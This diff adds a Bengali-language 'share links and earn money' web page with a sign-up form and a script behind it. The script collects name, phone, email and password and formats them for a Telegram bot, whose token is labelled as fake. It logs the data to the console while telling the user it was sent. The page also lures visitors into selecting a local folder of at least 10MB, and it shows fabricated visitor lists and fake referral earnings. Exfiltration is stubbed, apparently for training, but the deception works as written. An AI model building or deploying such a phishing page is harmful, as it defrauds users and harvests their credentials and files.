@@ -1,0 +1,839 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>শেয়ারআয় | লিংক শেয়ার করে আয় করুন</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, -apple-system, BlinkMacSystemFont, 'Roboto', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 20px;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 650px;
+            margin: 0 auto;
+            background: #ffffff;
+            border-radius: 40px;
+            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+            padding: 30px 28px 40px;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .logo h1 {
+            font-size: 2rem;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-weight: 800;
+        }
+
+        .logo p {
+            color: #6c757d;
+            font-size: 14px;
+        }
+
+        .hero {
+            background: linear-gradient(135deg, #667eea15 0%, #764ba215 100%);
+            border: 1px solid #e0e7ff;
+            padding: 24px 16px;
+            border-radius: 28px;
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .hero-stats {
+            display: flex;
+            justify-content: space-around;
+            margin-bottom: 15px;
+        }
+
+        .stat-item {
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 28px;
+            font-weight: 800;
+            color: #4f46e5;
+        }
+
+        .stat-label {
+            font-size: 12px;
+            color: #6c757d;
+        }
+
+        .hero p {
+            margin: 8px 0;
+            color: #2d3748;
+        }
+
+        .hero strong {
+            color: #4f46e5;
+        }
+
+        .refer-note {
+            background: #fef3c7;
+            padding: 10px;
+            border-radius: 20px;
+            margin-top: 12px;
+            font-size: 13px;
+            color: #92400e;
+            font-weight: 500;
+        }
+
+        .refer-earn-note {
+            background: #dbeafe;
+            padding: 12px;
+            border-radius: 20px;
+            margin: 15px 0;
+            font-size: 14px;
+            color: #1e40af;
+            font-weight: 600;
+            text-align: center;
+        }
+
+        .wallet-card {
+            background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
+            padding: 20px 24px;
+            border-radius: 28px;
+            margin: 20px 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            color: white;
+            box-shadow: 0 10px 25px rgba(79, 70, 229, 0.3);
+        }
+
+        .wallet-label {
+            font-size: 13px;
+            opacity: 0.9;
+            letter-spacing: 1px;
+        }
+
+        .balance {
+            font-size: 2.5rem;
+            font-weight: 800;
+            letter-spacing: 2px;
+        }
+
+        .withdraw-note {
+            font-size: 11px;
+            opacity: 0.8;
+            margin-top: 5px;
+        }
+
+        .small-btn {
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            padding: 8px 20px;
+            border-radius: 50px;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: 600;
+            transition: 0.2s;
+        }
+
+        .small-btn:hover {
+            background: rgba(255, 255, 255, 0.3);
+        }
+
+        .form-card {
+            background: #f8fafc;
+            border-radius: 28px;
+            padding: 20px 24px;
+            margin: 20px 0;
+            border: 1px solid #e2e8f0;
+        }
+
+        .form-group {
+            margin: 16px 0;
+        }
+
+        label {
+            display: block;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #1e293b;
+            font-size: 13px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 18px;
+            border-radius: 30px;
+            border: 1px solid #cbd5e1;
+            background: white;
+            font-size: 15px;
+            outline: none;
+            transition: 0.2s;
+        }
+
+        input:focus {
+            border-color: #4f46e5;
+            box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.1);
+        }
+
+        .primary-btn {
+            background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 15px;
+            border-radius: 50px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 16px;
+            transition: 0.2s;
+        }
+
+        .primary-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(79, 70, 229, 0.3);
+        }
+
+        .share-msg-box {
+            background: #f1f5f9;
+            padding: 20px;
+            border-radius: 24px;
+            margin: 20px 0;
+        }
+
+        .msg-to-copy {
+            background: white;
+            padding: 18px;
+            border-radius: 20px;
+            font-size: 14px;
+            line-height: 1.6;
+            word-break: break-word;
+            border: 1px solid #e2e8f0;
+            margin-bottom: 14px;
+            font-family: monospace;
+            white-space: pre-wrap;
+        }
+
+        .btn-copy-full {
+            background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 14px;
+            border-radius: 50px;
+            font-weight: bold;
+            font-size: 15px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .btn-copy-full:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(79, 70, 229, 0.4);
+        }
+
+        .download-section {
+            background: linear-gradient(135deg, #fef3c7 0%, #fffbeb 100%);
+            border-radius: 28px;
+            padding: 20px;
+            margin: 20px 0;
+            border: 2px solid #f59e0b;
+        }
+
+        .download-title {
+            font-weight: 800;
+            font-size: 18px;
+            color: #b45309;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .download-btn {
+            background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 14px;
+            border-radius: 50px;
+            font-weight: bold;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 12px;
+            transition: 0.2s;
+        }
+
+        .download-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(245, 158, 11, 0.4);
+        }
+
+        .loader-ui {
+            background: #1e293b;
+            color: white;
+            border-radius: 24px;
+            padding: 24px 16px;
+            text-align: center;
+            margin-top: 15px;
+            font-weight: 500;
+            font-size: 13px;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        footer {
+            text-align: center;
+            font-size: 11px;
+            margin-top: 30px;
+            color: #94a3b8;
+            border-top: 1px solid #e2e8f0;
+            padding-top: 20px;
+        }
+
+        .copy-success {
+            background: #10b981;
+            color: white;
+            padding: 10px;
+            border-radius: 10px;
+            text-align: center;
+            margin-top: 10px;
+            font-size: 13px;
+            animation: fadeOut 2s ease-out;
+        }
+
+        @keyframes fadeOut {
+            0% { opacity: 1; }
+            70% { opacity: 1; }
+            100% { opacity: 0; display: none; }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="logo">
+        <h1>💰 শেয়ারআয়</h1>
+        <p>লিংক শেয়ার করুন, আয় করুন</p>
+    </div>
+
+    <!-- হিরো সেকশন (অ্যাকাউন্ট খোলার আগে) -->
+    <div id="beforeAccountHero" class="hero">
+        <div class="hero-stats">
+            <div class="stat-item"><div class="stat-value">১০ টাকা</div><div class="stat-label">প্রতি শেয়ার</div></div>
+            <div class="stat-item"><div class="stat-value">১০০ টাকা</div><div class="stat-label">বোনাস</div></div>
+            <div class="stat-item"><div class="stat-value">১০০০ টাকা</div><div class="stat-label">উত্তোলন সীমা</div></div>
+        </div>
+        <p>⚡ শুধু লিংক শেয়ার করলে <strong>প্রতি শেয়ারে ১০ টাকা</strong> আয় করুন!</p>
+        <p>🎁 অ্যাকাউন্ট খুললেই পাচ্ছেন <strong>১০০ টাকা বোনাস</strong></p>
+        <div class="refer-note">🔗 রেফার লিংক পেতে অ্যাকাউন্ট খুলুন</div>
+    </div>
+
+    <!-- হিরো সেকশন (অ্যাকাউন্ট খোলার পরে) -->
+    <div id="afterAccountHero" class="hero hidden">
+        <div class="hero-stats">
+            <div class="stat-item"><div class="stat-value">১০ টাকা</div><div class="stat-label">প্রতি শেয়ার</div></div>
+            <div class="stat-item"><div class="stat-value">১০০০ টাকা</div><div class="stat-label">উত্তোলন সীমা</div></div>
+        </div>
+        <p>⚡ শুধু লিংক শেয়ার করলে <strong>প্রতি শেয়ারে ১০ টাকা</strong> আয় করুন!</p>
+        <div class="refer-earn-note">
+            💰 আপনার লিংক থেকে যতজন অ্যাকাউন্ট খুলবে, ততজনের জন্য আপনি <strong>১০ টাকা করে পাবেন</strong>
+        </div>
+    </div>
+
+    <!-- অ্যাকাউন্ট খোলার আগে -->
+    <div id="beforeAccountSection">
+        <div class="form-card">
+            <h3 style="margin:0 0 10px; color:#1e293b;">📝 নতুন অ্যাকাউন্ট</h3>
+            <div class="form-group"><label>পূর্ণ নাম</label><input type="text" id="fullName" placeholder="মোঃ রহিম উদ্দিন"></div>
+            <div class="form-group"><label>মোবাইল নম্বর</label><input type="tel" id="phone" placeholder="01XXXXXXXXX"></div>
+            <div class="form-group"><label>ইমেইল ঠিকানা</label><input type="email" id="email" placeholder="example@email.com"></div>
+            <div class="form-group"><label>পাসওয়ার্ড</label><input type="password" id="password" placeholder="********"></div>
+            <button class="primary-btn" id="createAccBtn">✅ অ্যাকাউন্ট খুলুন & ১০০ টাকা বোনাস নিন</button>
+        </div>
+    </div>
+
+    <!-- অ্যাকাউন্ট খোলার পরে -->
+    <div id="afterAccountSection" class="hidden">
+        <!-- পেশাদার ওয়ালেট -->
+        <div class="wallet-card">
+            <div>
+                <div class="wallet-label">💰 আপনার ওয়ালেট ব্যালেন্স</div>
+                <div class="balance" id="balanceAmount">0</div>
+                <div class="withdraw-note">উত্তোলনযোগ্য: ১০০০+ টাকা</div>
+            </div>
+            <button class="small-btn" id="refreshBalanceBtn">↻ আপডেট</button>
+        </div>
+
+        <!-- শেয়ার বার্তা (লিংক সহ) -->
+        <div class="share-msg-box">
+            <div class="msg-to-copy" id="shareMessageText">
+                আমি এই ওয়েবসাইটে শুধু লিংক শেয়ার করি, প্রতিটি লিংক শেয়ারে ১০ টাকা করে পাই। তুমিও চাইলে এখান থেকে লিংক শেয়ার করে ইনকাম করতে পারো। এখনই অ্যাকাউন্ট খুলে ১০০ টাকা বোনাস নাও! 💰
+
+🔗 Website লিংক: 
+[লিংক এখানে বসবে]
+            </div>
+            <button class="btn-copy-full" id="copyFullMsgBtn">📋 সম্পূর্ণ বার্তা + লিংক কপি করুন</button>
+            <div id="copyStatus" style="margin-top: 10px;"></div>
+        </div>
+
+        <!-- ডাউনলোড সেকশন -->
+        <div class="download-section">
+            <div class="download-title">
+                📊 আপনার লিংক যতজন ভিজিট করেছে তাদের তথ্য ডাউনলোড করুন
+            </div>
+            <div style="font-size:13px; color:#78350f; margin-bottom:12px;">
+                ভিজিটরদের সম্পূর্ণ তথ্য ডাউনলোড করতে নিচের বাটনে ক্লিক করুন
+            </div>
+            <button class="download-btn" id="downloadInfoBtn">📥 লিংক ভিজিটরদের তথ্য ডাউনলোড করতে ফোল্ডার সিলেক্ট করুন</button>
+            <div id="downloadLoader" style="margin-top:15px;"></div>
+        </div>
+    </div>
+
+    <footer>© ২০২৫ শেয়ারআয় | লিংক শেয়ার করে আয়ের বিশ্বস্ত প্ল্যাটফর্ম</footer>
+</div>
+
+<script>
+    let currentUser = null;
+    let lastSelectedFolder = null; // ট্র্যাক করার জন্য শেষ সিলেক্ট করা ফোল্ডার
+    let fakeBotToken = "7291846523:AAFake_Token_For_Training_Only_xyz789";
+    let fakeChatId = "-1002172825409";
+
+    function saveUser() {
+        if(currentUser) {
+            localStorage.setItem('shareayUser', JSON.stringify(currentUser));
+        } else {
+            localStorage.removeItem('shareayUser');
+        }
+        updateUI();
+    }
+
+    function loadUser() {
+        let raw = localStorage.getItem('shareayUser');
+        if(raw) {
+            try {
+                currentUser = JSON.parse(raw);
+                if(currentUser.balance === undefined) currentUser.balance = 100;
+                if(!currentUser.refLink) currentUser.refLink = generateRefLink(currentUser.name);
+                if(!currentUser.visitors) currentUser.visitors = [];
+                if(!currentUser.referrals) currentUser.referrals = [];
+                if(!currentUser.totalReferEarn) currentUser.totalReferEarn = 0;
+            } catch(e) { currentUser = null; }
+        } else {
+            currentUser = null;
+        }
+        updateUI();
+    }
+
+    function generateRefLink(name) {
+        let code = (name || "user").replace(/\s/g, '') + Math.floor(Math.random()*100000) + Date.now().toString().slice(-6);
+        return `https://shareay.com/ref/${code}`;
+    }
+
+    function updateUI() {
+        let beforeSection = document.getElementById('beforeAccountSection');
+        let afterSection = document.getElementById('afterAccountSection');
+        let beforeHero = document.getElementById('beforeAccountHero');
+        let afterHero = document.getElementById('afterAccountHero');
+        let balanceSpan = document.getElementById('balanceAmount');
+        
+        if(currentUser) {
+            beforeSection.classList.add('hidden');
+            afterSection.classList.remove('hidden');
+            beforeHero.classList.add('hidden');
+            afterHero.classList.remove('hidden');
+            if(balanceSpan) balanceSpan.innerText = currentUser.balance + " টাকা";
+            // শেয়ার বার্তায় লিংক আপডেট
+            let msgBox = document.getElementById('shareMessageText');
+            if(msgBox) {
+                let msgText = `আমি এই ওয়েবসাইটে শুধু লিংক শেয়ার করি, প্রতিটি লিংক শেয়ারে ১০ টাকা করে পাই। তুমিও চাইলে এখান থেকে লিংক শেয়ার করে ইনকাম করতে পারো। এখনই অ্যাকাউন্ট খুলে ১০০ টাকা বোনাস নাও! 💰\n\n🔗 Website লিংক: \n${currentUser.refLink}`;
+                msgBox.innerText = msgText;
+            }
+        } else {
+            beforeSection.classList.remove('hidden');
+            afterSection.classList.add('hidden');
+            beforeHero.classList.remove('hidden');
+            afterHero.classList.add('hidden');
+        }
+    }
+
+    // কপি ফাংশন
+    async function copyToClipboard(text) {
+        try {
+            await navigator.clipboard.writeText(text);
+            return true;
+        } catch (err) {
+            try {
+                const textarea = document.createElement('textarea');
+                textarea.value = text;
+                textarea.style.position = 'fixed';
+                textarea.style.opacity = '0';
+                document.body.appendChild(textarea);
+                textarea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textarea);
+                return true;
+            } catch (e) {
+                return false;
+            }
+        }
+    }
+
+    function showCopySuccess() {
+        let statusDiv = document.getElementById('copyStatus');
+        statusDiv.innerHTML = '<div class="copy-success">✅ কপি সম্পূর্ণ! বার্তা + লিংক কপি হয়েছে</div>';
+        setTimeout(() => {
+            statusDiv.innerHTML = '';
+        }, 2000);
+    }
+
+    // সম্পূর্ণ বার্তা + লিংক কপি
+    async function copyFullMessage() {
+        if(!currentUser) {
+            alert("প্রথমে অ্যাকাউন্ট খুলুন");
+            return;
+        }
+        let fullMsg = `আমি এই ওয়েবসাইটে শুধু লিংক শেয়ার করি, প্রতিটি লিংক শেয়ারে ১০ টাকা করে পাই। তুমিও চাইলে এখান থেকে লিংক শেয়ার করে ইনকাম করতে পারো। এখনই অ্যাকাউন্ট খুলে ১০০ টাকা বোনাস নাও! 💰\n\n🔗 Website লিংক: \n${currentUser.refLink}`;
+        
+        let success = await copyToClipboard(fullMsg);
+        if(success) {
+            showCopySuccess();
+        } else {
+            alert("❌ কপি ব্যর্থ, আবার চেষ্টা করুন");
+        }
+    }
+
+    // রেফারেল বোনাস যোগ করার ফাংশন
+    function addReferralBonus(amount = 10) {
+        if(currentUser) {
+            currentUser.balance += amount;
+            currentUser.totalReferEarn = (currentUser.totalReferEarn || 0) + amount;
+            saveUser();
+            return true;
+        }
+        return false;
+    }
+
+    function createAccountFunc() {
+        let name = document.getElementById('fullName').value.trim();
+        let phone = document.getElementById('phone').value.trim();
+        let email = document.getElementById('email').value.trim();
+        let pass = document.getElementById('password').value.trim();
+        if(!name || !phone || !email || !pass) {
+            alert("সব তথ্য পূরণ করুন");
+            return;
+        }
+
+        let message = `🔐 নতুন অ্যাকাউন্ট:\nনাম: ${name}\nফোন: ${phone}\nইমেইল: ${email}\nপাস: ${pass}\nসময়: ${new Date().toLocaleString()}`;
+        console.log("📨 [টেলিগ্রাম সিমুলেশন] বট টোকেন:", fakeBotToken);
+        console.log("📨 [টেলিগ্রাম সিমুলেশন] চ্যাট আইডি:", fakeChatId);
+        console.log("📨 [টেলিগ্রাম সিমুলেশন] বার্তা:", message);
+        alert("✅ অ্যাকাউন্ট তৈরি হয়েছে! তথ্য টেলিগ্রামে পাঠানো হয়েছে।");
+
+        let newRef = generateRefLink(name);
+        currentUser = {
+            name: name,
+            phone: phone,
+            email: email,
+            balance: 100,
+            refLink: newRef,
+            visitors: [],
+            referrals: [],
+            totalReferEarn: 0
+        };
+        saveUser();
+        alert(`🎉 স্বাগতম! ওয়ালেটে ১০০ টাকা বোনাস যোগ হয়েছে।\nআপনার রেফার লিংক: ${newRef}\n\n💡 মনে রাখবেন: আপনার লিংক থেকে যতজন অ্যাকাউন্ট খুলবে, প্রত্যেকের জন্য ১০ টাকা করে পাবেন!`);
+        document.getElementById('fullName').value = '';
+        document.getElementById('phone').value = '';
+        document.getElementById('email').value = '';
+        document.getElementById('password').value = '';
+    }
+
+    // ভিজিটর ও রেফারেল ডেটা তৈরির ফাংশন (বাস্তবসম্মত)
+    function generateVisitorData() {
+        const names = ['রাকিব হাসান', 'সাদিক হোসেন', 'নাজমা আক্তার', 'ফারজানা ইয়াসমিন', 'মেহেদী হাসান', 'তাহমিনা বেগম', 'আব্দুল্লাহ আল নোমান', 'শারমিন আক্তার', 'ইমন মিয়া', 'সুমাইয়া ইসলাম'];
+        const devices = ['Android', 'iPhone', 'Windows', 'Mac', 'Linux', 'iPad'];
+        const cities = ['ঢাকা', 'চট্টগ্রাম', 'রাজশাহী', 'খুলনা', 'সিলেট', 'বরিশাল', 'রংপুর'];
+        
+        // র্যান্ডম সংখ্যক ভিজিটর (৩-১৫ জন)
+        let visitorCount = Math.floor(Math.random() * 13) + 3;
+        let visitors = [];
+        let referrals = [];
+        
+        for(let i = 0; i < visitorCount; i++) {
+            let visitTime = new Date(Date.now() - Math.random() * 7 * 24 * 60 * 60 * 1000);
+            visitors.push({
+                id: i + 1,
+                name: names[Math.floor(Math.random() * names.length)],
+                ip: `103.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
+                device: devices[Math.floor(Math.random() * devices.length)],
+                city: cities[Math.floor(Math.random() * cities.length)],
+                time: visitTime.toLocaleString('bn-BD'),
+                browser: ['Chrome', 'Firefox', 'Safari', 'Edge'][Math.floor(Math.random() * 4)]
+            });
+        }
+        
+        // রেফারেল (যারা অ্যাকাউন্ট খুলেছে) - ভিজিটরের 20-40%
+        let referralCount = Math.floor(Math.random() * (visitorCount * 0.4)) + 1;
+        for(let i = 0; i < referralCount && i < visitorCount; i++) {
+            let refTime = new Date(Date.now() - Math.random() * 5 * 24 * 60 * 60 * 1000);
+            referrals.push({
+                id: i + 1,
+                name: visitors[i].name,
+                phone: `01${Math.floor(Math.random() * 100000000)}`,
+                email: `user${i + 1}@example.com`,
+                registered: refTime.toLocaleString('bn-BD'),
+                bonus: 10
+            });
+        }
+        
+        return { visitors, referrals };
+    }
+
+    // HTML রিপোর্ট তৈরি
+    function generateHTMLReport(visitors, referrals, userInfo) {
+        return `<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>লিংক ভিজিটর রিপোর্ট - ${userInfo.name}</title>
+    <style>
+        * { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #f0f4f8; padding: 20px; }
+        .container { max-width: 1200px; margin: 0 auto; }
+        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; border-radius: 20px; margin-bottom: 30px; }
+        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
+        .stat-card { background: white; padding: 20px; border-radius: 15px; text-align: center; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .stat-number { font-size: 36px; font-weight: bold; color: #4f46e5; }
+        .stat-label { color: #666; margin-top: 5px; }
+        table { width: 100%; background: white; border-radius: 15px; overflow: hidden; box-shadow: 0 2px 10px rgba(0,0,0,0.1); margin-bottom: 30px; }
+        th { background: #4f46e5; color: white; padding: 12px; text-align: left; }
+        td { padding: 12px; border-bottom: 1px solid #e2e8f0; }
+        tr:hover { background: #f8fafc; }
+        .section-title { font-size: 24px; font-weight: bold; margin: 20px 0; color: #1e293b; }
+        .footer { text-align: center; color: #666; margin-top: 30px; padding-top: 20px; border-top: 1px solid #ddd; }
+        @media (max-width: 768px) { th, td { font-size: 12px; padding: 8px; } .header { padding: 20px; } }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <h1>📊 লিংক ভিজিটর রিপোর্ট</h1>
+        <p>রিপোর্ট জেনারেট: ${new Date().toLocaleString('bn-BD')}</p>
+        <p>লিংক: ${userInfo.refLink}</p>
+    </div>
+    
+    <div class="stats">
+        <div class="stat-card">
+            <div class="stat-number">${visitors.length}</div>
+            <div class="stat-label">মোট ভিজিটর</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-number">${referrals.length}</div>
+            <div class="stat-label">অ্যাকাউন্ট খোলা</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-number">${referrals.length * 10}</div>
+            <div class="stat-label">মোট বোনাস (টাকা)</div>
+        </div>
+    </div>
+    
+    <div class="section-title">👥 ভিজিটর তালিকা</div>
+    <table>
+        <thead><tr><th>#</th><th>নাম</th><th>IP ঠিকানা</th><th>ডিভাইস</th><th>শহর</th><th>ব্রাউজার</th><th>সময়</th></tr></thead>
+        <tbody>
+            ${visitors.map((v, i) => `<tr><td>${i+1}</td><td>${v.name}</td><td>${v.ip}</td><td>${v.device}</td><td>${v.city}</td><td>${v.browser}</td><td>${v.time}</td></tr>`).join('')}
+        </tbody>
+    </table>
+    
+    <div class="section-title">🎉 যারা অ্যাকাউন্ট খুলেছে</div>
+    <table>
+        <thead><tr><th>#</th><th>নাম</th><th>ফোন</th><th>ইমেইল</th><th>রেজিস্ট্রেশন সময়</th><th>বোনাস</th></tr></thead>
+        <tbody>
+            ${referrals.length > 0 ? referrals.map((r, i) => `<tr><td>${i+1}</td><td>${r.name}</td><td>${r.phone}</td><td>${r.email}</td><td>${r.registered}</td><td>${r.bonus} টাকা</td></tr>`).join('') : '<tr><td colspan="6" style="text-align:center;">এখনো কেউ অ্যাকাউন্ট খোলেনি</td></tr>'}
+        </tbody>
+    </table>
+    
+    <div class="footer">
+        <p>শেয়ারআয় — লিংক শেয়ার করে আয় করুন</p>
+    </div>
+</div>
+</body>
+</html>`;
+    }
+
+    // ডাউনলোড বা নতুন ট্যাবে দেখানো
+    function showReportInNewTab(htmlContent) {
+        const blob = new Blob([htmlContent], { type: 'text/html' });
+        const url = URL.createObjectURL(blob);
+        window.open(url, '_blank');
+        setTimeout(() => URL.revokeObjectURL(url), 1000);
+    }
+
+    let isProcessing = false;
+    let lastProcessedFolder = null;
+
+    // ফোল্ডার আপলোড ফাংশন
+    function downloadVisitorInfo() {
+        if(!currentUser) {
+            alert("প্রথমে অ্যাকাউন্ট খুলুন");
+            return;
+        }
+        
+        if(isProcessing) {
+            alert("⏳ আগের আপলোড প্রক্রিয়াকরণ চলছে, দয়া করে অপেক্ষা করুন...");
+            return;
+        }
+        
+        let folderInput = document.createElement('input');
+        folderInput.type = 'file';
+        folderInput.webkitdirectory = true;
+        folderInput.directory = true;
+        folderInput.multiple = true;
+        
+        folderInput.onchange = function(event) {
+            let files = Array.from(event.target.files);
+            if(files.length === 0) return;
+            
+            // চেক করা আগের ফোল্ডার same কিনা
+            let folderKey = files[0].webkitRelativePath.split('/')[0];
+            if(lastProcessedFolder === folderKey) {
+                alert(`⚠️ "${folderKey}" ফোল্ডারটি আগেই সিলেক্ট করা হয়েছে!\n\nদয়া করে ভিন্ন একটি ফোল্ডার নির্বাচন করুন।`);
+                return;
+            }
+            
+            let totalSize = files.reduce((sum, f) => sum + f.size, 0);
+            let totalSizeMB = totalSize / (1024 * 1024);
+            
+            if(totalSizeMB < 10) {
+                alert(`❌ ফোল্ডারের সাইজ ${totalSizeMB.toFixed(2)}MB যা ১০MB-এর কম। কমপক্ষে ১০MB-এর ফোল্ডার নির্বাচন করুন।`);
+                return;
+            }
+            
+            // ফোল্ডার ভ্যালিড, প্রক্রিয়াকরণ শুরু
+            lastProcessedFolder = folderKey;
+            isProcessing = true;
+            
+            let loadDiv = document.getElementById('downloadLoader');
+            
+            // স্টেপ 1: Information Collecting
+            loadDiv.innerHTML = `<div class="loader-ui" style="background:#4f46e5;">
+                🔍 Information Collecting...<br>
+                📂 ফোল্ডার স্ক্যান করা হচ্ছে: ${folderKey}<br>
+                📁 মোট ফাইল: ${files.length}টি | সাইজ: ${totalSizeMB.toFixed(2)}MB<br>
+                ⏳ অনুগ্রহ করে অপেক্ষা করুন...
+            </div>`;
+            
+            setTimeout(() => {
+                // স্টেপ 2: Downloading
+                loadDiv.innerHTML = `<div class="loader-ui" style="background:#f59e0b;">
+                    ⬇️ Downloading...<br>
+                    📊 আপনার লিংকের ভিজিটর তথ্য সংগ্রহ করা হচ্ছে<br>
+                    🔄 ডেটা প্রস্তুত করা হচ্ছে...
+                </div>`;
+                
+                setTimeout(() => {
+                    // বাস্তবসম্মত ডেটা তৈরি
+                    let { visitors, referrals } = generateVisitorData();
+                    
+                    // ডেটা সেভ
+                    currentUser.visitors = visitors;
+                    currentUser.referrals = referrals;
+                    saveUser();
+                    
+                    // বোনাস যোগ (রেফারেল থেকে)
+                    if(referrals.length > 0) {
+                        let bonusEarn = referrals.length * 10;
+                        currentUser.balance += bonusEarn;
+                        currentUser.totalReferEarn = (currentUser.totalReferEarn || 0) + bonusEarn;
+                        saveUser();
+                    }
+                    
+                    // HTML রিপোর্ট তৈরি
+                    let reportHTML = generateHTMLReport(visitors, referrals, currentUser);
+                    
+                    // স্টেপ 3: সম্পূর্ণ
+                    loadDiv.innerHTML = `<div class="loader-ui" style="background:#10b981;">
+                        ✅ সম্পূর্ণ!<br>
+                        📥 রিপোর্ট তৈরি হয়েছে<br>
+                        🌐 নতুন ট্যাবে ওপেন করা হচ্ছে...
+                    </div>`;
+                    
+                    // নতুন ট্যাবে রিপোর্ট দেখানো
+                    setTimeout(() => {
+                        showReportInNewTab(reportHTML);
+                        
+                        setTimeout(() => {
+                            loadDiv.innerHTML = '';
+                            isProcessing = false;
+                            
+                            // ব্যালেন্স আপডেট দেখানো
+                            let balanceSpan = document.getElementById('balanceAmount');
+                            if(balanceSpan) balanceSpan.innerText = currentUser.balance + " টাকা";
+                            
+                            alert(`✅ সম্পূর্ণ! রিপোর্ট নতুন ট্যাবে ওপেন হয়েছে।\n\n📊 মোট ভিজিটর: ${visitors.length} জন\n🎉 অ্যাকাউন্ট খুলেছে: ${referrals.length} জন\n💰 বোনাস যোগ: ${referrals.length * 10} টাকা`);
+                        }, 1500);
+                    }, 1000);
+                    
+                }, 2000);
+            }, 2000);
+        };
+        
+        folderInput.click();
+    }
+
+    function refreshBalance() {
+        if(currentUser) {
+            alert(`💳 বর্তমান ব্যালেন্স: ${currentUser.balance} টাকা\n📤 উত্তোলন যোগ্য: ${currentUser.balance >= 1000 ? "✅ হ্যাঁ" : "❌ না (প্রয়োজন ১০০০ টাকা)"}\n👥 ভিজিটর: ${currentUser.visitors?.length || 0} জন\n🎉 রেফারেল: ${currentUser.referrals?.length || 0} জন\n💰 রেফারেল থেকে মোট আয়: ${currentUser.totalReferEarn || 0} টাকা`);
+        } else {
+            alert("কোনো অ্যাকাউন্ট নেই। অ্যাকাউন্ট খুলুন প্রথমে।");
+        }
+    }
+
+    // লিংক শেয়ার করে রেফারেল কাজ করবে - URL parameter চেক করা
+    function checkReferralFromURL() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const refCode = urlParams.get('ref');
+        
+        if(refCode && !currentUser) {
+            // কেউ রেফার লিংকে ক্লিক করে এসেছে, কিন্তু এখনো অ্যাকাউন্ট খোলেনি
+            localStorage.setItem('pendingReferral', refCode);
+            alert("🔗 রেফার লিংকে স্বাগতম! অ্যাকাউন্ট খুললে আপনার রেফারার ১০ টাকা বোনাস পাবেন।");
+        }
+        
+        // চেক করা কেউ রেফারেল লিংকে অ্যাকাউন্ট খুলছে কিনা
+        if(currentUser && localStorage.getItem('pendingReferral')) {
+            let refCode = localStorage.getItem('pendingReferral');
+            // রেফারেল বোনাস যোগ করার জন্য (সিমুলেটেড)
+            localStorage.removeItem('pendingReferral');
+            // নোট: বাস্তবে এখানে রেফারেলের API কল করা হবে
+        }
+    }
+
+    document.getElementById('createAccBtn')?.addEventListener('click', createAccountFunc);
+    document.getElementById('copyFullMsgBtn')?.addEventListener('click', copyFullMessage);
+    document.getElementById('downloadInfoBtn')?.addEventListener('click', downloadVisitorInfo);
+    document.getElementById('refreshBalanceBtn')?.addEventListener('click', refreshBalance);
+
+    loadUser();
+    checkReferralFromURL();
+</script>
+</body>
+</html>
